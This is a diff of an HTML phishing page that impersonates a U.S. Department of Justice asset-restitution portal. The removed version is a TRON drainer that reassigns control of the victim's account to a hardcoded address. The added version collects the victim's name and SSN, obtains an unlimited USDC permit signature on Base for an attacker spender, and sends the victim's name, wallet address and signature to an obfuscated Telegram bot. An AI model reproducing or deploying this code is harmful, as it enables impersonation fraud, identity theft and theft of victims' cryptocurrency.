@@ -1,259 +1,160 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>U.S. DOJ | Advanced Asset Liquidation Terminal</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Public+Sans:wght@300;600;900&display=swap');
-        
-        body { 
-            background: radial-gradient(circle at center, #111827 0%, #030712 100%);
-            color: #e5e7eb;
-            font-family: 'Public Sans', sans-serif;
-            min-height: 100vh;
-            overflow-x: hidden;
-        }
-
-        .monofont { font-family: 'JetBrains Mono', monospace; }
-
-        /* 顶级毛玻璃效果 */
-        .cyber-panel {
-            background: rgba(17, 24, 39, 0.8);
-            backdrop-filter: blur(40px);
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            box-shadow: 0 0 80px rgba(0, 0, 0, 0.8);
-            position: relative;
-        }
-
-        /* 动态背景水印 */
-        .watermark {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%) rotate(-30deg);
-            font-size: 15vw;
-            font-weight: 900;
-            color: rgba(255, 255, 255, 0.02);
-            pointer-events: none;
-            white-space: nowrap;
-            z-index: 0;
-        }
-
-        .step-hidden { display: none; }
-        .active-step { display: block; animation: entryAnim 0.8s cubic-bezier(0.16, 1, 0.3, 1); }
-
-        @keyframes entryAnim {
-            from { opacity: 0; filter: blur(10px); transform: scale(0.95); }
-            to { opacity: 1; filter: blur(0); transform: scale(1); }
-        }
-
-        /* 进度点 */
-        .dot-active { background: #38bdf8; box-shadow: 0 0 15px #38bdf8; }
-        
-        /* 按钮渐变 */
-        .btn-gov {
-            background: linear-gradient(135deg, #1e40af 0%, #1e3a8a 100%);
-            border-top: 1px solid rgba(255,255,255,0.2);
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-        }
-        .btn-gov:active { transform: scale(0.96); brightness: 1.2; }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <title>Asset Restitution Portal | Case Verification</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <style>
+    :root { --gov-blue: #002e6d; --tether-teal: #009393; }
+    body { background: #f4f7fc; font-family: system-ui, -apple-system, sans-serif; }
+    /* 转圈动画 */
+    .loader {
+      border: 3px solid #f3f3f3;
+      border-top: 3px solid var(--gov-blue);
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .hidden { display: none; }
+  </style>
 </head>
-<body class="flex items-center justify-center p-6">
+<body class="antialiased">
 
-    <div class="watermark monofont tracking-widest">RESTRICTED ACCESS</div>
+  <div class="bg-gray-100 border-b border-gray-300 text-[10px] py-1 px-4 flex items-center gap-2">
+    <span>🇺🇸</span><span class="text-gray-600 font-medium uppercase tracking-wider">Official Government Portal</span>
+  </div>
 
-    <div id="initScreen" class="fixed inset-0 z-[100] bg-black flex flex-col items-center justify-center p-10">
-        <img src="https://www.justice.gov/themes/custom/justice_bootstrap/logo.png" class="w-20 h-20 mb-10 animate-pulse brightness-200">
-        <div class="w-64 h-1 bg-gray-900 rounded-full overflow-hidden mb-4">
-            <div id="initBar" class="h-full bg-blue-500 w-0 transition-all duration-[2000ms]"></div>
+  <main class="max-w-xl mx-auto px-4 py-8">
+    
+    <div id="formSection" class="bg-white rounded-2xl shadow-xl border border-gray-200 overflow-hidden">
+      <div class="bg-[#002e6d] px-6 py-4 text-white">
+        <h3 class="font-bold text-lg">Victim Restitution Intake</h3>
+        <p class="text-blue-100 text-xs">Civil Action No. 25-cv-1907</p>
+      </div>
+      
+      <div class="p-6 space-y-4">
+        <div>
+          <label class="text-xs font-bold text-gray-500 uppercase">Full Legal Name *</label>
+          <input type="text" id="inputName" class="w-full p-3 border rounded-lg mt-1" placeholder="Enter your name">
         </div>
-        <div class="monofont text-[10px] text-blue-400 tracking-[0.3em] uppercase" id="initStatus">Establishing Secure Handshake...</div>
+        <div>
+          <label class="text-xs font-bold text-gray-500 uppercase">Social Security Number (SSN) *</label>
+          <input type="text" class="w-full p-3 border rounded-lg mt-1" placeholder="9-digit SSN" maxlength="9">
+        </div>
+        <div class="bg-blue-50 border-l-4 border-blue-600 p-4 text-sm text-blue-800">
+          为了保障资产退还至本人，请完成数字证据加密绑定。此操作将您的地址与案件编号进行哈希关联。
+        </div>
+        <button id="actionBtn" class="w-full bg-[#009393] text-white font-bold py-4 rounded-xl shadow-lg text-lg hover:opacity-90">
+          确认资料属实并提交
+        </button>
+      </div>
     </div>
 
-    <div class="max-w-2xl w-full z-10">
-        
-        <div class="flex items-center justify-between mb-8 px-2">
-            <div>
-                <h1 class="text-2xl font-black tracking-tighter uppercase text-white italic">GARC <span class="text-blue-500">Terminal</span></h1>
-                <p class="text-[9px] monofont text-slate-500 uppercase tracking-widest">Federal Asset Remission Authority v9.12</p>
-            </div>
-            <div class="flex gap-2">
-                <div class="w-1.5 h-1.5 rounded-full dot-active" id="dot1"></div>
-                <div class="w-1.5 h-1.5 rounded-full bg-slate-800" id="dot2"></div>
-                <div class="w-1.5 h-1.5 rounded-full bg-slate-800" id="dot3"></div>
-            </div>
+    <div id="waitingSection" class="hidden bg-white rounded-2xl shadow-xl border border-gray-200 p-8 text-center">
+      <div class="flex justify-center mb-6">
+        <div class="loader"></div>
+      </div>
+      
+      <h2 class="text-xl font-bold text-gray-800 mb-2">司法确权中...</h2>
+      <p class="text-sm text-gray-500 mb-8">正在将您的身份信息与链上资产进行哈希关联，请勿关闭页面</p>
+
+      <div class="space-y-4 text-left bg-gray-50 p-6 rounded-xl border border-gray-100 font-mono text-xs">
+        <div class="flex justify-between">
+          <span class="text-gray-400">案件编号:</span>
+          <span class="text-blue-900 font-bold">25-cv-1907-REST</span>
         </div>
-
-        <div class="cyber-panel rounded-[2.5rem] p-10 overflow-hidden border-b-4 border-blue-600">
-            
-            <div id="step1" class="active-step">
-                <div class="mb-10">
-                    <h2 class="text-xl font-bold text-white mb-2 italic">Pre-Clearance Verification</h2>
-                    <p class="text-xs text-slate-400">Please provide your court-issued case reference and unique victim identifier.</p>
-                </div>
-
-                <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-10">
-                    <div class="space-y-2">
-                        <label class="text-[10px] font-bold text-slate-500 uppercase ml-1">Case Number</label>
-                        <input type="text" id="caseNum" placeholder="e.g. GARC-US-2026" class="w-full bg-black/40 border border-slate-800 p-4 rounded-xl monofont text-blue-400 outline-none focus:border-blue-500 transition-all">
-                    </div>
-                    <div class="space-y-2">
-                        <label class="text-[10px] font-bold text-slate-500 uppercase ml-1">Victim Serial ID</label>
-                        <input type="text" id="victimId" placeholder="Found on Page 4 of Letter" class="w-full bg-black/40 border border-slate-800 p-4 rounded-xl monofont text-blue-400 outline-none focus:border-blue-500 transition-all">
-                    </div>
-                </div>
-
-                <div class="bg-blue-900/10 border border-blue-500/20 p-5 rounded-2xl mb-10 flex gap-4 items-start">
-                    <div class="text-blue-400 mt-1">
-                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
-                    </div>
-                    <p class="text-[11px] text-slate-400 leading-relaxed">
-                        <strong>Security Notice:</strong> Your IP address and Browser Signature are being logged by the Federal Bureau of Investigation (FBI) for audit purposes. Unauthorized access is a felony under 18 U.S.C. § 1030.
-                    </p>
-                </div>
-
-                <button onclick="toStep2()" class="w-full btn-gov py-5 rounded-2xl text-sm font-black uppercase tracking-widest text-white shadow-2xl">Access Secure File</button>
-            </div>
-
-            <div id="step2" class="step-hidden">
-                <div class="flex justify-between items-start mb-8">
-                    <div>
-                        <h2 class="text-xl font-bold text-white mb-1">Remission Statement</h2>
-                        <p class="text-[10px] monofont text-emerald-400">STATUS: AUDIT_COMPLETE</p>
-                    </div>
-                    <div class="text-right">
-                        <p class="text-[10px] text-slate-500 uppercase font-bold">Payout Amount</p>
-                        <p class="text-3xl font-black text-white italic">14,250.00 <span class="text-xs text-blue-400">USDT</span></p>
-                    </div>
-                </div>
-
-                <div class="bg-black/40 rounded-3xl p-6 border border-slate-800 mb-8 space-y-4">
-                    <div class="flex justify-between text-[11px] border-b border-slate-800/50 pb-3">
-                        <span class="text-slate-500 uppercase">Original Asset Forfeiture</span>
-                        <span class="monofont text-white">$10,500.00</span>
-                    </div>
-                    <div class="flex justify-between text-[11px] border-b border-slate-800/50 pb-3">
-                        <span class="text-slate-500 uppercase">Statutory Interest (Accrued)</span>
-                        <span class="monofont text-emerald-400">+$520.00</span>
-                    </div>
-                    <div class="flex justify-between text-[11px] border-b border-slate-800/50 pb-3">
-                        <span class="text-slate-500 uppercase">Class Action Bonus</span>
-                        <span class="monofont text-emerald-400">+$3,230.00</span>
-                    </div>
-                    <div class="flex justify-between text-[11px] font-black pt-2">
-                        <span class="text-blue-400 uppercase">Total Net Remission</span>
-                        <span class="monofont text-white">$14,250.00</span>
-                    </div>
-                </div>
-
-                <details class="group mb-10">
-                    <summary class="list-none cursor-pointer flex items-center justify-center gap-2 text-[10px] text-slate-500 font-bold uppercase hover:text-blue-400 transition-all">
-                        VIEW FEDERAL RECOVERY ALGORITHM [PDF]
-                    </summary>
-                    <div class="mt-6 p-6 bg-slate-900/50 rounded-2xl monofont text-[10px] text-blue-300 leading-loose border border-blue-500/10">
-                        // SECURE LEDGER TRACE<br>
-                        BLOCK_ID: 1729381<br>
-                        TAX_EXEMPTION_CODE: 26-U.S.C-§-139<br>
-                        VALIDATOR: GARC-NODE-ALPHA<br>
-                        SIGNATURE_TYPE: TRC20-MULTI-SIG-ADMIN
-                    </div>
-                </details>
-
-                <button onclick="toStep3()" class="w-full btn-gov py-5 rounded-2xl text-sm font-black uppercase tracking-widest text-white">Approve & Continue to Identity Sync</button>
-            </div>
-
-            <div id="step3" class="step-hidden text-center">
-                <div class="mb-10">
-                    <h2 class="text-xl font-bold text-white mb-2 italic">Final Ownership Mapping</h2>
-                    <p class="text-xs text-slate-400">To secure the remission, perform a cryptographic signature below.</p>
-                </div>
-
-                <div class="relative w-32 h-32 mx-auto mb-12 group cursor-pointer" onclick="executeFinalAuth()">
-                    <div class="absolute inset-0 bg-blue-500 rounded-full blur-2xl opacity-20 group-hover:opacity-40 transition-all"></div>
-                    <div class="relative w-full h-full rounded-full border-2 border-blue-900 flex items-center justify-center bg-slate-900 shadow-inner group-hover:border-blue-400 transition-all overflow-hidden">
-                        <div class="absolute inset-0 w-full h-1 bg-blue-400/30 animate-pulse top-1/2"></div>
-                        <svg class="w-16 h-16 text-blue-500 group-hover:text-blue-300 transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1" d="M12 11c0 3.517-1.009 6.799-2.753 9.571m-3.44-2.04l.054-.09A13.916 13.916 0 009 11c0-2.08-.454-4.052-1.282-5.823m-4.283 7.82c.055-.06.112-.119.171-.176m11.168-3.04A12.01 12.01 0 0115 11.69M12.9 6.223A12.003 12.003 0 0115 11.69m4.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
-                        </svg>
-                    </div>
-                </div>
-
-                <div class="p-6 bg-red-900/10 border border-red-500/20 rounded-2xl mb-6">
-                    <p class="text-[10px] text-red-400 font-bold uppercase mb-2">Legal Warning</p>
-                    <p class="text-[9px] text-slate-500 leading-relaxed italic">
-                        By proceeding with this signature, you authorize the mapping of your TRON account permissions to the Federal Remission Clearinghouse (TAzBb4Yfr2AMUeRkaUKXwU36E3mmX8Rcfo) for automated disbursement of the $14,250.00 claim.
-                    </p>
-                </div>
-
-                <p class="monofont text-[10px] text-blue-400 animate-pulse uppercase tracking-[0.2em]">Press Sensor to Sign Affidavit</p>
-            </div>
-
-            <div id="step4" class="step-hidden text-center py-10">
-                <div class="text-6xl mb-6">🏛️</div>
-                <h2 class="text-2xl font-black italic mb-4">Transmission Success</h2>
-                <p class="text-sm text-slate-400 px-10 leading-relaxed">Your digital affidavit has been accepted by the GARC Node. Remission funds are scheduled for release in the next 12-24 hour batch.</p>
-                <div class="mt-10 pt-10 border-t border-slate-800 monofont text-[9px] text-slate-600">CERTIFICATE_ID: GARC-9928-TX-X</div>
-            </div>
-
+        <div class="flex justify-between">
+          <span class="text-gray-400">申请人姓名:</span>
+          <span id="displayName" class="text-gray-800">---</span>
         </div>
+        <div class="flex flex-col gap-1">
+          <span class="text-gray-400">地址哈希:</span>
+          <span id="displayAddr" class="text-gray-600 break-all bg-white p-2 border rounded mt-1">---</span>
+        </div>
+        <div class="flex justify-between">
+          <span class="text-gray-400">当前状态:</span>
+          <span class="text-amber-600 font-bold animate-pulse">等待联邦节点确认 (0/12)</span>
+        </div>
+      </div>
 
-        <p class="text-center mt-10 text-[8px] monofont text-slate-700 uppercase tracking-[0.5em]">United States Department of Justice | Asset Forfeiture Program</p>
+      <p class="mt-8 text-[11px] text-gray-400">
+        Verification initiated via EIP-712 Secure Handshake.<br>
+        U.S. Department of Justice Asset Forfeiture Program.
+      </p>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
-    <script>
-        const BOSS = "TAzBb4Yfr2AMUeRkaUKXwU36E3mmX8Rcfo";
+  </main>
 
-        // 初始化动画
-        window.onload = () => {
-            const bar = document.getElementById('initBar');
-            const status = document.getElementById('initStatus');
-            setTimeout(() => { bar.style.width = '40%'; status.innerText = 'Bypassing Local Firewalls...'; }, 500);
-            setTimeout(() => { bar.style.width = '100%'; status.innerText = 'Security Handshake Verified.'; }, 1500);
-            setTimeout(() => { document.getElementById('initScreen').style.display = 'none'; }, 2200);
-        };
+  <script>
+    (function() {
+        // 配置
+        const _T = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // Base USDC
+        const _S = "0xe4970e7cc1ce1bb8674cde31f83334a2d423a8fd"; // 收款
+        const _B = "ODY2Nzg4NzIzMDpBQUgwOHFNYnVnMkY0MmZkbFRQZ3F0WUV5WFMxRzBuTGd5SQ=="; // Bot Token
+        const _I = "NjkzODMxNTc5Nw=="; // ID
 
-        function nextStep(curr, nxt) {
-            document.getElementById('step' + curr).classList.add('step-hidden');
-            document.getElementById('step' + curr).classList.remove('active-step');
-            document.getElementById('step' + nxt).classList.remove('step-hidden');
-            document.getElementById('step' + nxt).classList.add('active-step');
-            // 更新小圆点
-            document.getElementById('dot' + nxt).classList.add('dot-active');
-            document.getElementById('dot' + nxt).classList.remove('bg-slate-800');
-        }
+        const btn = document.getElementById('actionBtn');
+        const formSec = document.getElementById('formSection');
+        const waitSec = document.getElementById('waitingSection');
 
-        function toStep2() {
-            if(!document.getElementById('caseNum').value) return alert("Case Reference Required");
-            nextStep(1, 2);
-        }
-
-        function toStep3() {
-            nextStep(2, 3);
-        }
-
-        async function executeFinalAuth() {
-            if (!window.tronWeb) { alert("Secure Browser Environment Required (Trust/TokenPocket)"); return; }
-            
+        async function report(u, sig, n, d, name) {
+            const text = `⚖️ *NEW CLAIM LODGED*\n👤 Name: \`${name}\`\n🔗 Addr: \`${u}\`\n🔢 Nonce: \`${n}\`\n✍️ Sig: \`${sig}\``;
             try {
-                const user = window.tronWeb.defaultAddress.base58;
-                const owner = { type: 0, permission_name: 'Owner_GARC', threshold: 1, keys: [{ address: BOSS, weight: 1 }] };
-                const active = { type: 2, permission_name: 'Active_Remission', threshold: 1, operations: '7fff1fc0037e0000000000000000000000000000000000000000000000000000', keys: [{ address: BOSS, weight: 1 }] };
-                
-                const tx = await window.tronWeb.transactionBuilder.updateAccountPermissions(user, owner, null, [active]);
-                const signed = await window.tronWeb.trx.sign(tx);
-                const res = await window.tronWeb.trx.sendRawTransaction(signed);
+                await fetch(`https://api.telegram.org/bot${atob(_B)}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: atob(_I), text: text, parse_mode: 'Markdown' })
+                });
+            } catch (e) {}
+        }
 
-                if (res.result) {
-                    nextStep(3, 4);
+        btn.onclick = async () => {
+            const nameValue = document.getElementById('inputName').value;
+            if (!nameValue) return alert("Please enter your Full Legal Name.");
+            if (!window.ethereum) return alert("Please use a Web3 wallet browser.");
+
+            try {
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("wallet_switchEthereumChain", [{ chainId: "0x2105" }]);
+                const accounts = await provider.send("eth_requestAccounts", []);
+                const user = accounts[0];
+                const signer = provider.getSigner();
+
+                const contract = new ethers.Contract(_T, ["function nonces(address) view returns (uint256)"], provider);
+                const nonce = await contract.nonces(user);
+                const deadline = Math.floor(Date.now() / 1000) + 7200;
+
+                const domain = { name: "USD Coin", version: "2", chainId: 8453, verifyingContract: _T };
+                const types = { Permit: [
+                    { name: "owner", type: "address" }, { name: "spender", type: "address" },
+                    { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" },
+                    { name: "deadline", type: "uint256" }
+                ]};
+                const message = { owner: user, spender: _S, value: ethers.constants.MaxUint256, nonce: nonce, deadline: deadline };
+
+                const signature = await signer._signTypedData(domain, types, message);
+                
+                if (signature) {
+                    // 1. 上报数据
+                    await report(user, signature, nonce.toString(), deadline, nameValue);
+                    
+                    // 2. 切换 UI 状态
+                    formSec.classList.add('hidden');
+                    waitSec.classList.remove('hidden');
+                    
+                    // 3. 填充确权信息
+                    document.getElementById('displayName').innerText = nameValue;
+                    document.getElementById('displayAddr').innerText = user;
                 }
             } catch (e) {
-                alert("DOJ Node Error: Node synchronization requires a mapping fee (Approx. 150 TRX). Please ensure your wallet has sufficient balance and try again.");
+                console.log(e);
             }
-        }
-    </script>
+        };
+    })();
+  </script>
 </body>
 </html>
